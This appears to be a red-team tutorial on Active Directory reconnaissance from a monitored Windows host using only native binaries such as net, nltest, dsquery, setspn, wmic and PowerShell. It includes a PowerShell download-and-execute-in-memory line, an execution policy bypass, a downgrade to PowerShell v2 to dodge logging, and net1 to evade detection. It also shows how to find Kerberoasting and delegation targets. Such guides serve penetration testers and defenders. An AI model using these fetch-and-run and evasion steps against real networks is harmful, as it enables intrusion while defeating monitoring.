A common scenario is obtaining access to a domain-joined machine that is heavily monitored. Uploading tools like SharpHound, PowerView, or custom binaries is not possible due to EDR, AppLocker, or network controls.

The objective is to perform domain reconnaissance using only binaries already present in Windows. This reduces detection because activity resembles normal administrative behavior.

---

## Basic environment identification

First understand where you are and which identity you are using:

```
whoami                         # shows current logged-in user
whoami /all                    # displays user SID, groups and privileges
hostname                       # shows machine hostname
echo %USERDOMAIN%              # prints current domain name
echo %LOGONSERVER%             # shows authenticating domain controller
```

This reveals the current user, group memberships, privileges, and the domain controller handling authentication.

To confirm domain membership:

```
systeminfo | findstr /B /C:"Domain"   # extracts domain information from systeminfo
```

---

## Environment and host reconnaissance

Basic environmental commands provide quick visibility into host configuration and network context.

```
hostname                       # displays computer name
systeminfo                     # shows OS, patches and system details
ipconfig /all                  # lists network interfaces and configuration
set                            # displays environment variables
echo %USERDOMAIN%              # prints domain name
echo %LOGONSERVER%             # shows domain controller used
```

Additional useful checks:

```
[System.Environment]::OSVersion.Version         # shows OS version via .NET
wmic qfe get Caption,Description,HotFixID,InstalledOn   # lists installed patches
```

These commands reveal OS version, installed patches, domain association, and network configuration while generating minimal noise.

---

## PowerShell reconnaissance (native capabilities)

PowerShell provides extensive built-in enumeration without requiring external tooling.

Available modules:

```
Get-Module                   # lists loaded PowerShell modules
```

Execution policy configuration:

```
Get-ExecutionPolicy -List    # shows execution policy at all scopes
```

Temporary execution policy bypass (process only):

```
Set-ExecutionPolicy Bypass -Scope Process   # bypasses policy for current session
```

Environment variables:

```
Get-ChildItem Env: | ft Key,Value   # lists environment variables in table format
```

PowerShell history inspection:

```
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt   # reads PS command history
```

Download and execute content in memory:

```
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL'); <commands>"   # downloads and executes script in memory
```

---

## PowerShell downgrade (logging awareness)

Older PowerShell versions may reduce logging visibility.

Check version:

```
Get-Host                  # displays PowerShell host version
```

Downgrade session:

```
powershell.exe -version 2   # starts PowerShell v2 session
```

PowerShell versions prior to 3.0 do not support Script Block Logging, though the downgrade action itself may still be logged.

---

## Domain and domain controller discovery

Get domain controller information:

```
nltest /dsgetdc:<DOMAIN>   # retrieves domain controller details
```

List available domain controllers:

```
nltest /dclist:<DOMAIN>    # lists all domain controllers
```

Check trust relationships:

```
nltest /domain_trusts      # enumerates domain trust relationships
```

Inspect environment variables:

```
set l                      # filters environment variables starting with 'l'
```

---

## User and group enumeration

Using classic NetAPI tools:

```
net user /domain                 # lists domain users
net user username /domain        # shows details of specific domain user
net group /domain                # lists domain groups
net group "Domain Admins" /domain   # lists members of Domain Admins
```

This allows discovery of privilege relationships without BloodHound.

---

## Useful Net commands
| Command                                  | Description                                    |
| ---------------------------------------- | ---------------------------------------------- |
| `net accounts`                           | Displays the local password policy             |
| `net accounts /domain`                   | Displays the domain password policy            |
| `net group /domain`                      | Lists all domain groups                        |
| `net group "Domain Admins" /domain`      | Enumerates members of the Domain Admins group  |
| `net group "Domain Controllers" /domain` | Lists domain controllers                       |
| `net localgroup`                         | Shows local groups on the machine              |
| `net localgroup administrators`          | Lists local administrators                     |
| `net localgroup administrators /domain`  | Checks domain admins in local administrators   |
| `net share`                              | Displays shared resources                      |
| `net user /domain`                       | Enumerates domain users                        |
| `net user <ACCOUNT_NAME> /domain`        | Shows details for a specific domain user       |
| `net use`                                | Displays mapped network drives and connections |
| `net view`                               | Lists visible computers on the network         |
| `net view /domain`                       | Lists domain hosts                             |
| `net view \\computer /ALL`               | Enumerates shares on a remote computer         |

### net1 alternative

If monitoring solutions alert on `net.exe`, the same functionality can be executed using:

```
net1 user /domain      # alternative binary to list domain users
net1 group /domain     # alternative binary to list domain groups
```

`net1` performs identical operations but may bypass simplistic command-string detections.

---

## Enumeration using native PowerShell (AD module)

If RSAT or AD modules are available:

```
Get-ADUser -Filter * -Properties *   # enumerates all AD users with properties
Get-ADComputer -Filter *             # lists domain computers
Get-ADGroup -Filter *                # lists domain groups
```

If unavailable, ADSI remains usable:

```
([adsisearcher]"(objectClass=user)").FindAll()   # LDAP query for user objects
```

---

## Dsquery enumeration

`dsquery` enables LDAP-based Active Directory searches using native binaries.

User enumeration:

```
dsquery user        # lists domain users
```

Computer enumeration:

```
dsquery computer    # lists domain computers
```

Enumerate objects inside an OU:

```
dsquery * "CN=Users,DC=<DOMAIN>,DC=LOCAL"   # queries objects inside Users container
```

LDAP filter example (users with PASSWD_NOTREQD):

```
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl   # finds users without password requirement
```

---

## Session and lateral movement discovery

Logged-in users:

```
query user     # shows logged-in users
qwinsta        # lists RDP/terminal sessions
```

Active SMB sessions:

```
net session    # displays active SMB sessions
```

Shared resources:

```
net share      # lists local shares
```

Mapped connections:

```
net use        # shows mapped drives and connections
```

These commands help identify lateral movement opportunities and active users.

---

## SPN enumeration (Kerberoasting discovery equivalent)

Without external tooling:

```
setspn -T <DOMAIN> -Q */*   # lists accounts with registered SPNs
```

Lists accounts with registered SPNs that may be Kerberoasting targets.

---

## Kerberos delegation discovery

Unconstrained delegation:

```
Get-ADComputer -Filter {TrustedForDelegation -eq $true}   # finds computers with unconstrained delegation
```

Constrained delegation:

```
Get-ADObject -Filter {msDS-AllowedToDelegateTo -like "*"} -Properties msDS-AllowedToDelegateTo   # finds constrained delegation configs
```

---

## Policy and configuration enumeration

Applied policies:

```
gpresult /r        # shows applied group policies
```

Full policy report:

```
gpresult /h report.html   # generates HTML GPO report
```

Useful for identifying login scripts, credential exposure, or insecure configurations.

---

## Firewall and Defender checks

Firewall status:

```
netsh advfirewall show allprofiles   # displays firewall configuration
```

Windows Defender service state:

```
sc query windefend   # checks Defender service status
```

Detailed Defender configuration:

```
Get-MpComputerStatus   # shows Defender protection details
```

These commands reveal protection state, scanning behavior, and defensive posture.

---

## Internal network enumeration

ARP table:

```
arp -a        # lists ARP cache entries
```

Routing table:

```
route print   # displays routing table
```

Basic domain discovery:

```
net view /domain   # enumerates domain computers
```

These commands identify reachable hosts, known networks, and potential pivot paths.

---

## Windows Management Instrumentation (WMI)

WMI enables deep host and domain enumeration using native Windows interfaces.

```
wmic qfe get Caption,Description,HotFixID,InstalledOn   # lists installed hotfixes
wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List   # system and domain info
wmic process list /format:list      # lists running processes
wmic ntdomain list /format:list     # shows domain information
wmic useraccount list /format:list  # enumerates user accounts
wmic group list /format:list        # enumerates groups
wmic sysaccount list /format:list   # lists system accounts
```

WMI queries provide insight into domain structure, processes, accounts, and system configuration without deploying external tools.